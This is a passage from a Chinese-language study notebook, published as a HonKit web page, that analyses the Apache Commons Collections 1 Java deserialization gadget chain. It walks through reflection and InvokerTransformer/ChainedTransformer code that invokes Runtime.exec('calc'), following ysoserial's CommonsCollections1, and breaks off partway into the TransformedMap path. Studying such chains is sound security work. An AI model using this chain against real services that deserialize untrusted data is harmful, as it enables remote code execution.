@@ -1,0 +1,1233 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <title>Java 安全漫谈 09 ~ 11.CommonsCollections1 · Java Sec</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="HonKit 4.0.0">
+        <meta name="author" content="zha0cai">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-versions-select/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book honkit-cloak">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://github.com/zha0cai" target="_blank" class="custom-link">My github</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    JavaSec
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">反序列化</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    利用链学习
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="2.1.1" data-path="Java 安全漫谈 - 09 ~ 11.CommonsCollections1.html">
+            
+                <a href="Java 安全漫谈 - 09 ~ 11.CommonsCollections1.html">
+            
+                    
+                    Java 安全漫谈 09 ~ 11.CommonsCollections1
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
+            本书使用 HonKit 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Java 安全漫谈 09 ~ 11.CommonsCollections1</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#前言"><b></b>前言</a></li><ul><li><span class="title-icon "></span><a href="#jdk-源码环境准备"><b></b>JDK 源码环境准备</a></li><li><span class="title-icon "></span><a href="#反序列链原理"><b></b>反序列链原理</a></li></ul><li><span class="title-icon "></span><a href="#调试分析"><b></b>调试分析</a></li><ul><li><span class="title-icon "></span><a href="#初探"><b></b>初探</a></li><ul><li><span class="title-icon "></span><a href="#普通反射-runtimeexec-执行命令"><b></b>普通反射 Runtime.exec 执行命令</a></li><li><span class="title-icon "></span><a href="#invoketransformer-反射执行命令"><b></b>InvokeTransformer 反射执行命令</a></li></ul><li><span class="title-icon "></span><a href="#ysoserial-cc1-分析"><b></b>Ysoserial CC1 分析</a></li><ul><li><span class="title-icon "></span><a href="#transformedmap-利用链"><b></b>TransformedMap 利用链</a></li><li><span class="title-icon "></span><a href="#lazymap-利用链"><b></b>LazyMap 利用链</a></li></ul></ul><li><span class="title-icon "></span><a href="#poc--exp"><b></b>POC &amp; EXP</a></li><ul><li><span class="title-icon "></span><a href="#transformedmap"><b></b>TransformedMap</a></li><li><span class="title-icon "></span><a href="#lazymap"><b></b>LazyMap</a></li></ul><li><span class="title-icon "></span><a href="#前人栽树"><b></b>前人栽树</a></li></ul></div><a href="#前言" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="前言"><a name="前言" class="anchor-navigation-ex-anchor" href="#前言"><i class="fa fa-link" aria-hidden="true"></i></a>前言</h1>
+<p>从本篇开始，正式进入反序列化 RCE 利用链分析的大门，始终是逃不过。大手子们的挖掘真的拍案叫绝，精彩绝伦。学徒本徒，这篇笔记应该是事无巨细的了。</p>
+<h2 id="jdk-源码环境准备"><a name="jdk-源码环境准备" class="anchor-navigation-ex-anchor" href="#jdk-源码环境准备"><i class="fa fa-link" aria-hidden="true"></i></a>JDK 源码环境准备</h2>
+<ul>
+<li><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></li>
+<li><a href="https://blog.csdn.net/bisal/article/details/118947676" target="_blank">JDK 的版本号解惑</a></li>
+<li><a href="https://blog.csdn.net/leisure_life/article/details/108367675" target="_blank">openJDK 各个版本的源码下载，方便查看 native 修饰的方法</a></li>
+</ul>
+<p>调试反序列化利用链会对 jdk 的版本、<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections" target="_blank">Apache Commons Collections</a> 的版本有要求。</p>
+<p>如何在 IDEA 里面查找 jdk 源码呢？比如说下面这种，一般 <code>Find Usages</code> 是进不到里面去的，因为是反编译 <code>.class</code> 文件得出来的源码。</p>
+<p>D:\Java\jdk1.8.0_20\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class</p>
+<p><img src="assets/image-20220918125916-1skywqq.png" alt="image"></p>
+<p>所以我们要将源码加进去。【<a href="https://www.oracle.com/java/technologies/downloads/archive/" target="_blank">Oracle JDK</a> 和 <a href="https://openjdk.org/" target="_blank">Open JDK</a> 的版本不一定对的上。】</p>
+<ul>
+<li><p><a href="https://www.oracle.com/java/technologies/downloads/archive/" target="_blank">https://www.oracle.com/java/technologies/downloads/archive/</a></p>
+<p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox" target="_blank">找到 8u65</a> --&gt; <a href="https://download.oracle.com/otn/java/jdk/8u65-b17/jdk-8u65-windows-x64.exe" target="_blank">jdk-8u65-windows-x64.exe</a> 可以用虚拟机安装把 JDK 提取出来。</p>
+</li>
+<li><a href="https://openjdk.org/projects/jdk/" target="_blank">https://openjdk.org/projects/jdk/</a>--&gt; <a href="https://hg.openjdk.java.net/" target="_blank">Mercurial</a></li>
+</ul>
+<p><img src="assets/image-20220918140115-uw6edcq.png" alt="image"></p>
+<p><img src="assets/image-20220918140228-je9qot9.png" alt="image">​</p>
+<p>本次我使用的是 8u20 的 JDK 版本。</p>
+<ol>
+<li>将 &quot;D:\Java\jdk-f5d77a430a29（1.8.0_20 openJDK 源码）\jdk-f5d77a430a29\src\share\classes\&quot; 中的 <code>sun</code> 文件夹拷贝。</li>
+<li>将 &quot;D:\Java\jdk1.8.0_20\src.zip&quot; 解压</li>
+<li>将 1 中的 sun 文件夹拷贝到解压出来的 sun 文件夹中</li>
+<li><p>在 idea 中添加 sun 文件夹。【File --&gt; Project Settings --&gt; SDKs --&gt; Sourcepath】</p>
+<p><img src="assets/image-20220918140657-uewadhj.png" alt="image"></p>
+</li>
+<li><p>可以看到 AnnotationInvocationHandler 已经由 <code>.class 文件</code> 变成了 <code>.java 文件</code> 。</p>
+<p><img src="assets/image-20220918140924-78v5poh.png" alt="image">​</p>
+</li>
+</ol>
+<h2 id="反序列链原理"><a name="反序列链原理" class="anchor-navigation-ex-anchor" href="#反序列链原理"><i class="fa fa-link" aria-hidden="true"></i></a>反序列链原理</h2>
+<p>反序列化漏洞就是：</p>
+<ol>
+<li>Web 应用反序序列化用户输入（信任/不受信任），即可控的序列化点。</li>
+<li>存在反序列化利用链 --&gt; RCE</li>
+</ol>
+<blockquote>
+<p><code>This is what serialized Java objects look like, they can be identified by this header. They always begin with “ac ed 00 05…” and when that is base64 encoded it comes out as “rO0…”. Keep an eye open for those two strings.</code></p>
+</blockquote>
+<p><code>lsof -i -P | grep java | grep LISTEN</code></p>
+<p>接收任意对象执行 readObject 方法进行反序列化 --&gt; 重写的 readObject 方法，里面存在接收任意对象作为参数的方法（可序列化 -- 集合类型/Object/Map） --&gt; ...... --&gt; 调用危险方法（不同类的同名函数/任意方法调用（反射/动态加载字节码））。【A.readObject.invoke/ --&gt; B.f】</p>
+<h1 id="调试分析"><a name="调试分析" class="anchor-navigation-ex-anchor" href="#调试分析"><i class="fa fa-link" aria-hidden="true"></i></a>调试分析</h1>
+<h2 id="初探"><a name="初探" class="anchor-navigation-ex-anchor" href="#初探"><i class="fa fa-link" aria-hidden="true"></i></a>初探</h2>
+<p>根据 CC1 链我们知道和 Transformer 有关，查看一下 <code>org.apache.commons.collections.Transformer</code> 的实现类一共有 16 个。【<strong>以此反推</strong>】</p>
+<p>从 CC1 出发直接看 InvokerTransformer 类。</p>
+<p><img src="assets/image-20220918182532-5ligh3m.png" alt="image"></p>
+<h3 id="普通反射-runtimeexec-执行命令"><a name="普通反射-runtimeexec-执行命令" class="anchor-navigation-ex-anchor" href="#普通反射-runtimeexec-执行命令"><i class="fa fa-link" aria-hidden="true"></i></a>普通反射 Runtime.exec 执行命令</h3>
+<p><code>Runtime run = Runtime.getRuntime()</code> 直接获取， Runtime 类不能序列化。</p>
+<pre><code class="lang-java">java.lang.Runtime 没有继承 Serializable 类。 -- 用反射创建 Runtime 对象即可。
+</code></pre>
+<pre><code class="lang-java"><span class="hljs-comment">/**
+ * 普通的 Runtime.exec 反射
+ * Runtime.getRuntime().exec(&quot;calc&quot;);
+ * 类全名获取类的 Class 对象 【类的原型（Class 类可以理解为类的类，每个类都有一个对应的 Class 对象）】
+ * getMethod：方法名，方法参数类型 【无参方法则方法参数类型为 null】
+ * invoke：获取到的类的实例化对象，方法的参数 【如果是静态方法则为 null，无参 null】因为静态方法属于类，不属于类对象，所以对象为 null。
+ */</span>
+Class clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);
+Method getruntimeMethod = clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>);
+Object runtimeObj = getruntimeMethod.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);
+
+Method method = clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);
+method.invoke(runtimeObj, <span class="hljs-string">&quot;calc&quot;</span>);
+</code></pre>
+<h3 id="invoketransformer-反射执行命令"><a name="invoketransformer-反射执行命令" class="anchor-navigation-ex-anchor" href="#invoketransformer-反射执行命令"><i class="fa fa-link" aria-hidden="true"></i></a>InvokeTransformer 反射执行命令</h3>
+<p><code>org.apache.commons.collections.functors.InvokerTransformer</code> 看一下其中实现的 <code>transform</code> 方法。【<strong>危险方法 --&gt; RCE</strong>】</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 接收任意对象 Object 作为输入</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>{
+    <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) {
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+    }
+    <span class="hljs-keyword">try</span> {
+        <span class="hljs-comment">// 获取输入的任意类的 Class 对象，反射执行对象的任意方法</span>
+        Class cls = input.getClass();
+        Method method = cls.getMethod(iMethodName, iParamTypes);
+        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);
+
+    } <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) {
+        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; does not exist&quot;</span>);
+    } <span class="hljs-keyword">catch</span> (IllegalAccessException ex) {
+        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; cannot be accessed&quot;</span>);
+    } <span class="hljs-keyword">catch</span> (InvocationTargetException ex) {
+        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &apos;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&apos; on &apos;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&apos; threw an exception&quot;</span>, ex);
+    }
+}
+</code></pre>
+<p>这个 InvokeTransformer 的 transform 方法其实就是一个用反射实现的执行任意方法的方法。【<strong>危险方法</strong>】</p>
+<p>接着看看 <code>InvokerTransformer</code> 的构造函数。<code>org.apache.commons.collections.functors.InvokerTransformer#InvokerTransformer</code></p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>{
+    <span class="hljs-keyword">super</span>();
+    iMethodName = methodName;
+    iParamTypes = paramTypes;
+    iArgs = args;
+}
+
+<span class="hljs-comment">// 后面反射执行方法的参数都是通过这个构造函数获取的，可以看到需要的参数依次为，需要执行的方法名 methodName， 所需执行方法的参数的类型 paramTypes，需要执行的方法的参数值 args。</span>
+</code></pre>
+<p>那么将反射执行 <code>java.lang.Runtime#exec(java.lang.String)</code> 改成 InvokerTransformer 反射执行的形式就如下。</p>
+<ul>
+<li>创建 InvokeTransformer 的实例对象，调用 transform 方法。</li>
+<li>方法名、参数类型、参数值都通过构造函数获取。</li>
+<li>所需对象通过 transform 方法接收。</li>
+</ul>
+<pre><code class="lang-java"><span class="hljs-comment">/**
+ * 改写成 InvokeTransformer 的版本：
+ * 1. 我们要执行 Runtime 对象的 exec 方法。
+ * 2. 那么我们就要给 transform 方法传进去一个 Runtime 对象，再通过反射执行 exec 方法。
+ * 【注】：暂时不考虑序列化
+ */</span>
+InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>});
+invokerTransformer.transform(Runtime.getRuntime());
+
+----------
+能不能直接反射执行 getRuntime 方法进行实例化创建对象呢？这是来自反射没学好的我一瞬间的想法 orz。
+        <span class="hljs-comment">/**
+         * 答案是不能的。 
+         * - Runtime 类直接调用它的静态方法 getRuntime。
+         * - Runtime 类不可序列化，其次 Runtime.class 获取的是 Runtime 类的 Class 实例对象。 Class 类并没有 getRuntime 方法。
+         * - Exception in thread &quot;main&quot; org.apache.commons.collections.FunctorException: InvokerTransformer: The method &apos;getRuntime&apos; on &apos;class java.lang.Class&apos; does not exist
+         *     at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:128)
+         */</span>
+        InvokerTransformer getRuntimeInvokeTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-keyword">null</span>}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>});
+        Object runtimeObj = getRuntimeInvokeTransformer.transform(Runtime.class);
+
+----------
+        <span class="hljs-comment">// 将 Runtime.getRumtime() 也要改成 InvokerTransformer 的反射形式</span>
+        <span class="hljs-comment">/**
+         * 改写成 InvokeTransformer 的版本：
+         * 1. 我们要执行 Runtime 对象的 exec 方法。
+         * 2. 那么我们就要给 transform 方法传进去一个 Runtime 对象，通过反射获取 Runtime 对象。
+         * 3. 再通过反射执行 exec 方法。
+         */</span>
+        <span class="hljs-comment">// 反射获取 Runtime 实例化对象。clazz 对象的 getMethod 方法，反射调用 getMethod 方法。</span>
+        <span class="hljs-comment">//Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span>
+        <span class="hljs-comment">//Method getruntimeMethod = clazz.getMethod(&quot;getRuntime&quot;, null);</span>
+        InvokerTransformer getMethodInvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>});
+        Method getRuntimeMethod = (Method) getMethodInvokerTransformer.transform(Runtime.class);<span class="hljs-comment">// getMethod 方法是 Class 实例对象的方法，所以传进去 Class 实例对象。</span>
+
+        <span class="hljs-comment">// Object runtimeObj = getruntimeMethod.invoke(null, null);</span>
+        InvokerTransformer invokeInvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] {Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>});
+        Object runtimeObj = invokeInvokerTransformer.transform(getRuntimeMethod); <span class="hljs-comment">// invoke 方法是 Method 实例对象的方法，所以传进去 Method 实例对象</span>
+
+        <span class="hljs-comment">//Method method = clazz.getMethod(&quot;exec&quot;, String.class);</span>
+        <span class="hljs-comment">//method.invoke(runtimeObj, &quot;calc&quot;);</span>
+        InvokerTransformer execInvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>});
+        execInvokerTransformer.transform(runtimeObj);
+</code></pre>
+<blockquote>
+<p><code>new InvokerTransformer(&quot;需要调用的方法名&quot;, new Class[] {方法的参数类型}, new Object[]{方法的参数值}).transform(是哪个类的实例对象【Object】的方法);</code></p>
+<p>【注意】可变参数<strong>类型</strong>即对应为数组<strong>类型</strong>，如 ：</p>
+<ul>
+<li><p><code>Class&lt;?&gt;... parameterTypes</code> 等价于 <code>Class [].class</code></p>
+<p>‍</p>
+</li>
+</ul>
+<p>最终是一个套娃的形式，里层的对象给外层使用，作为上一个 transform 方法的 Object 参数。</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 反射获取 Runtime 实例化对象。clazz 对象的 getMethod 方法，反射调用 getMethod 方法实例化 Runtime 对象。【注意】可变参数参数类型即对应的数组。</span>
+<span class="hljs-comment">// 在反射执行 exec 方法。【后一个作为前一个的输入对象】</span>
+<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>})
+    .transform(<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] {Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>})     .transform(<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>})
+           .transform(Runtime.class)));
+
+<span class="hljs-comment">// 从下往上传</span>
+</code></pre>
+</blockquote>
+<p>从上两段代码可以看出，<strong>前一个 InvokeTransformer 创建出来的对象供下一个 InvokerTransformer.transform 作为对象输入</strong>。所以先根据 <code>ysoserial.payloads.CommonsCollections1</code> 优化一下代码，创建 一个 ChainedTransformer 和 Transformer 数组。</p>
+<p><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
+<pre><code class="lang-java">    <span class="hljs-comment">/**
+     * Constructor that performs no validation.
+     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
+     * 
+     * <span class="hljs-doctag">@param</span> transformers  the transformers to chain, not copied, no nulls
+     */</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>{
+        <span class="hljs-keyword">super</span>();
+        iTransformers = transformers;
+    }
+
+    <span class="hljs-comment">/**
+     * Transforms the input to result via each decorated transformer
+     * 
+     * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer
+     * <span class="hljs-doctag">@return</span> the transformed result
+     */</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>{
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) {
+            object = iTransformers[i].transform(object);
+        }
+        <span class="hljs-keyword">return</span> object;
+    }
+</code></pre>
+<p>就可以改成</p>
+<pre><code class="lang-java">Transformer [] transformers = <span class="hljs-keyword">new</span> Transformer[] {
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>})
+        };
+        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+        chainedTransformer.transform(Runtime.class);
+
+----------&gt; 比较清晰，解释一下：
+chainedTransformer.transform(Runtime.class);  <span class="hljs-comment">// 控制第一个输入就好了</span>
+==&gt; object = iTransformers[i].transform(object); 那么第一个就是
+==&gt; iTransformers[<span class="hljs-number">0</span>].transform(Runtime.class) 即
+==&gt; <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>}).transform(Runtime.class)
+并且赋值给了 object，那么第二个就是
+==&gt; iTransformers[<span class="hljs-number">1</span>].transform(object); 以此类推...
+</code></pre>
+<p><img src="assets/image-20220930084153-nv9649d.png" alt="image">​</p>
+<p><strong>那么现在问题变成了有哪些对象调用</strong> <code>org.apache.commons.collections.functors.InvokerTransformer#transform</code> 这个<strong>危险方法</strong>呢？</p>
+<p>下一步就是找到使用 <code>InvokerTransformer#transform</code> 方法的地方，通过 Find Usages 可以看到有 21 处调用。</p>
+<p><img src="assets/image-20220926220014-ov5vepa.png" alt="image">​</p>
+<p>除去自己调用自己的，主要分布在 <code>commons-collections:commons-collections:3.1</code> 和 <code>commons-beanutils:commons-beanutils:1.9.2</code> 这两个包中，我们逐一进行筛查。</p>
+<p>正所谓前人栽树，按照 CC1 链的提示，我们把目光锁定在 map package 中的 <code>LazyMap</code> 类和 <code>TransformedMap</code> 类上。</p>
+<p><img src="assets/image-20220926220602-jqwmqf3.png" alt="image"></p>
+<h2 id="ysoserial-cc1-分析"><a name="ysoserial-cc1-分析" class="anchor-navigation-ex-anchor" href="#ysoserial-cc1-分析"><i class="fa fa-link" aria-hidden="true"></i></a>Ysoserial CC1 分析</h2>
+<h3 id="transformedmap-利用链"><a name="transformedmap-利用链" class="anchor-navigation-ex-anchor" href="#transformedmap-利用链"><i class="fa fa-link" aria-hidden="true"></i></a>TransformedMap 利用链</h3>
+<p>一共有 3 个方法调用了 <code>transformer</code> 方法，分别是：<code>transformKey</code>、<code>transformValue</code>、<code>checkSetValue</code> 。</p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>{
+    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) {
+        <span class="hljs-keyword">return</span> object;
+    }
+    <span class="hljs-keyword">return</span> keyTransformer.transform(object);
+}
+
+-----------
+<span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>{
+    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) {
+        <span class="hljs-keyword">return</span> object;
+    }
+    <span class="hljs-keyword">return</span> valueTransformer.transform(object);
+}
+
+-----------
+<span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>{
+    <span class="hljs-keyword">return</span> valueTransformer.transform(value);
+}
+</code></pre>
+<p>以 <code>checkSetValue</code> 为入口点：</p>
+<ul>
+<li><p>是实现了接口，注释写的很清楚了。<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#checkSetValue</code></p>
+<pre><code class="lang-java">    <span class="hljs-comment">/**
+     * Hook method called when a value is being set using &lt;code&gt;setValue&lt;/code&gt;.
+     * &lt;p&gt;
+     * An implementation may validate the value and throw an exception
+     * or it may transform the value into another object.
+     * &lt;p&gt;
+     * This implementation returns the input value.
+     * 
+     * <span class="hljs-doctag">@param</span> value  the value to check
+     * <span class="hljs-doctag">@throws</span> UnsupportedOperationException if the map may not be changed by setValue
+     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the specified value is invalid
+     * <span class="hljs-doctag">@throws</span> ClassCastException if the class of the specified value is invalid
+     * <span class="hljs-doctag">@throws</span> NullPointerException if the specified value is null and nulls are invalid
+     */</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span></span>;
+</code></pre>
+</li>
+<li><p><code>valueTransformer</code> 是什么值。</p>
+<p>通过构造函数赋值的，并且 <code>TransformerMap</code> 的这个构造函数是 protected 修饰的，通过静态方法 decorate 调用。</p>
+</li>
+<li>再通过 Find Usages 查看 checkSetValue 的调用情况。</li>
+</ul>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>{
+    <span class="hljs-keyword">super</span>(map);
+    <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;
+    <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;
+}
+
+<span class="hljs-comment">// 继续在本类中寻找是哪个函数调用了构造函数，答案是静态的 decorate 方法。用来装饰一个 map。一定要多看看源码和注释。</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);
+}
+</code></pre>
+<p>再继续看看调用了 <code>checkSetValue</code> 的地方， 仅有一处 <code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code></p>
+<p><img src="assets/image-20220927223809-oi2pua9.png" alt="image">​</p>
+<pre><code class="lang-java"><span class="hljs-comment">/**
+ * Implementation of a map entry that checks additions via setValue.
+ */</span>
+<span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapEntryDecorator</span> </span>{
+
+    <span class="hljs-comment">/** The parent map */</span>
